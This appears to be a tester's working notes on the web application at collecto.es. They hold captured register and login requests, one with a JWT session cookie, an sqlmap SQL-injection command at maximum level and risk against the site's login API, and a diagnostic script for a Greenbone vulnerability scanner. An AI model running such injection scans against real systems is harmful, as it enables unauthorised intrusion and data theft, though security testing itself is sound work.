POST /api/auth/register HTTP/2
Host: collecto.es
Content-Length: 150
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://collecto.es
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://collecto.es/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"email":"hola@hola.com","username":"usuario","firstName":"nombre","lastName":"apellido","password":"12345","confirmPassword":"12345","consent":false}

--------------

POST /api/auth/login HTTP/2
Host: collecto.es
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4Mzk0NzRjZThhOGVlYmUwZThkMGJlMyIsInVzZXJuYW1lIjoidXN1YXJpbyIsImlhdCI6MTc0ODU4NDI2OCwiZXhwIjoxNzQ4NTg3ODY4fQ.jhqIkb85jDyKZxrlhWZ6gCW48PnHuy5GvrhasEcWzpo
Content-Length: 60
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://collecto.es
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://collecto.es/universe/harry-potter
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":"miuser2","password":"12345","rememberMe":false}

-----


sqlmap -u "https://collecto.es/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST

----------


GET /socket.io/?EIO=4&transport=polling&t=fvxolk3d&sid=wSsa8LFroJ6eZkzyAACn 
POST /socket.io/?EIO=4&transport=polling&t=fvxs6l09&sid=wSsa8LFroJ6eZkzyAACn 


----

#!/bin/bash

echo "==== DIAGNÓSTICO DE GREENBONE/GVM ===="

# 1. Verificar servicios
echo -e "\n>> Estado de servicios:"
for svc in gvmd ospd-openvas; do
    echo -e "\n>>> $svc:"
    systemctl is-active "$svc" && systemctl status --no-pager "$svc" | grep -E "Active:|Loaded:"
done

# 2. Verificar procesos
echo -e "\n>> Procesos en ejecución:"
ps -u _gvm -f | grep -E 'gvmd|ospd' || echo "No hay procesos gvmd u ospd en ejecución con usuario _gvm"

# 3. Verificar sockets
echo -e "\n>> Verificando socket del escáner:"
if [ -e /run/ospd/ospd-openvas.sock ]; then
    echo "✅ Socket ospd-openvas encontrado en /run/ospd/ospd-openvas.sock"
    ls -l /run/ospd/ospd-openvas.sock
else
    echo "❌ Socket /run/ospd/ospd-openvas.sock NO encontrado"
fi

echo -e "\n>> Verificando PID de gvmd:"
if [ -e /run/gvmd/gvmd.pid ]; then
    echo "✅ PID gvmd encontrado en /run/gvmd/gvmd.pid"
    cat /run/gvmd/gvmd.pid
else
    echo "❌ No se encontró /run/gvmd/gvmd.pid"
fi

# 4. Verificar permisos de carpetas críticas
echo -e "\n>> Verificando permisos de /run/gvmd y /run/ospd:"
for dir in /run/gvmd /run/ospd; do
    if [ -d "$dir" ]; then
        echo "✅ Existe: $dir"
        ls -ld "$dir"
    else
        echo "❌ No existe: $dir"
    fi
done

# 5. Verificar grupos del usuario _gvm
echo -e "\n>> Verificando grupos del usuario _gvm:"
id _gvm || echo "❌ El usuario _gvm no existe"

# 6. Consultar scanners registrados
echo -e "\n>> Verificando scanners registrados:"
sudo runuser -u _gvm -- gvmd --get-scanners 2>/dev/null || echo "❌ Error consultando scanners (¿gvmd está caído?)"

# 7. Mostrar últimos errores del log
echo -e "\n>> Últimos 20 registros del log gvmd:"
journalctl -u gvmd -n 20 --no-pager

echo -e "\n==== FIN DEL DIAGNÓSTICO ===="

---
